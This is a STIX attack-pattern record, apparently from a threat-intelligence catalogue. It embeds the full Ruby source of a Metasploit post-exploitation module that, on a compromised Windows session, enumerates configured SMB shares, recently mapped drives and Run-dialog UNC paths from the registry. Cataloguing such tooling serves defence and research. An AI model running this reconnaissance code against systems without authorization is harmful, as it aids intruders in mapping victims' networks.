{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9205f9c8-4163-42ec-b3e0-d8f0c577e59c",
    "created": "2024-08-14T16:33:05.039818Z",
    "modified": "2024-08-14T16:33:05.039822Z",
    "name": "Windows Gather SMB Share Enumeration via Registry",
    "description": "This module will enumerate configured and recently used file shares. 'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/enum_shares.rb",
            "external_id": "enum_shares.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Registry\n  include Msf::Post::Windows::Priv\n\n  SID_PREFIX_USER = 'S-1-5-21-'.freeze\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather SMB Share Enumeration via Registry',\n        'Description' => %q{ This module will enumerate configured and recently used file shares. },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>' ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => %w[shell powershell meterpreter],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => []\n        },\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_registry_open_key\n              stdapi_registry_check_key_exists\n            ]\n          }\n        }\n      )\n    )\n    register_options([\n      OptBool.new('CURRENT', [ true, 'Enumerate currently configured shares', true]),\n      OptBool.new('RECENT', [ true, 'Enumerate recently mapped shares', true]),\n      OptBool.new('ENTERED', [ true, 'Enumerate recently entered UNC Paths in the Run Dialog', true])\n    ])\n  end\n\n  # Convert share type ID `val` to readable string\n  #\n  # @return [String] Share type as readable string\n  def share_type(val)\n    %w[DISK PRINTER DEVICE IPC SPECIAL TEMPORARY][val] || 'UNKNOWN'\n  end\n\n  # Method for enumerating recent mapped drives on target machine\n  #\n  # @return [Array] List of recently mounted UNC paths\n  def enum_recent_mounts(base_key)\n    partial_path = base_key + '\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer'\n    explorer_keys = registry_enumkeys(partial_path).to_s || ''\n\n    return [] unless explorer_keys.include?('Map Network Drive MRU')\n\n    full_path = \"#{partial_path}\\\\Map Network Drive MRU\"\n    vals_found = registry_enumvals(full_path)\n\n    return [] unless vals_found\n\n    recent_mounts = []\n    registry_enumvals(full_path).each do |k|\n      next if k.include?('MRUList')\n\n      mounted_path = registry_getvaldata(full_path, k)\n      recent_mounts << mounted_path if mounted_path.starts_with?('\\\\\\\\')\n    end\n\n    recent_mounts\n  end\n\n  # Method for enumerating UNC paths entered in Run dialog box\n  #\n  # @return [Array] List of MRU historical UNC paths\n  def enum_run_unc(base_key)\n    full_path = base_key + '\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\RunMRU'\n    vals_found = registry_enumvals(full_path)\n\n    return [] unless vals_found\n\n    unc_paths = []\n    vals_found.each do |k|\n      next if k.include?('MRUList')\n\n      run_entry = registry_getvaldata(full_path, k).to_s\n      unc_paths << run_entry.gsub(/\\\\1$/, '') if run_entry.starts_with?('\\\\\\\\')\n    end\n\n    unc_paths\n  end\n\n  # Method for enumerating configured shares on a target box\n  #\n  # @return [Array] List of network shares in the form of [ name, type, remark, path ]\n  def enum_conf_shares\n    shares_key = nil\n\n    [\n      'HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\services\\\\LanmanServer\\\\Shares',\n      'HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\services\\\\lanmanserver\\\\Shares'\n    ].each do |k|\n      if registry_key_exist?(k)\n        shares_key = k\n        break\n      end\n    end\n\n    if shares_key.blank?\n      print_status('No network shares were found')\n      return\n    end\n\n    share_names = registry_enumvals(shares_key)\n\n    if share_names.empty?\n      print_status('No network shares were found')\n      return\n    end\n\n    shares = []\n    print_status('The following shares were found:')\n    share_names.each do |sname|\n      share_info = registry_getvaldata(shares_key, sname)\n      next if share_info.nil?\n\n      print_status(\"\\tName: #{sname}\")\n\n      stype = remark = path = nil\n      share_info.each do |e|\n        name, val = e.split('=')\n        case name\n        when 'Path'\n          path = val\n          print_status \"\\tPath: #{path}\"\n        when 'Type'\n          stype = share_type(val.to_i)\n          print_status \"\\tType: #{stype}\"\n        when 'Remark'\n          remark = val\n          print_status(\"\\tRemark: #{remark}\") unless remark.blank?\n        end\n      end\n\n      print_status\n\n      # Match the format used by auxiliary/scanner/smb/smb_enumshares\n      # with an added field for path\n      shares << [ sname, stype, remark, path ]\n    end\n\n    report_note(\n      host: session,\n      type: 'smb.shares',\n      data: { shares: shares },\n      update: :unique_data\n    )\n  end\n\n  def run\n    unless datastore['CURRENT'] || datastore['RECENT'] || datastore['ENTERED']\n      fail_with(Failure::BadConfig, 'At least one option (CURRENT, RECENT, ENTERED) must be enabled. Nothing to do.')\n    end\n\n    hostname = sysinfo.nil? ? cmd_exec('hostname') : sysinfo['Computer']\n    print_status(\"Running module against #{hostname} (#{session.session_host})\")\n\n    enum_conf_shares if datastore['CURRENT']\n\n    return unless datastore['RECENT'] || datastore['ENTERED']\n\n    mount_history = []\n    run_history = []\n\n    if is_system? || is_admin?\n      mount_history = enum_recent_mounts('HKEY_CURRENT_USER') if datastore['RECENT']\n      run_history = enum_run_unc('HKEY_CURRENT_USER') if datastore['ENTERED']\n    else\n      keys = registry_enumkeys('HKU') || []\n      keys.each do |maybe_sid|\n        next unless maybe_sid.starts_with?(SID_PREFIX_USER)\n        next if maybe_sid.include?('_Classes')\n\n        mount_history += enum_recent_mounts(\"HKU\\\\#{maybe_sid.chomp}\") if datastore['RECENT']\n        run_history += enum_run_unc(\"HKU\\\\#{maybe_sid.chomp}\") if datastore['ENTERED']\n      end\n    end\n\n    unless mount_history.empty?\n      print_status('Recent mounts found:')\n      mount_history.each do |i|\n        print_status(\"\\t#{i}\")\n      end\n      print_status\n    end\n\n    unless run_history.empty?\n      print_status('Recent UNC paths entered in Run dialog found:')\n      run_history.each do |i|\n        print_status(\"\\t#{i}\")\n      end\n      print_status\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}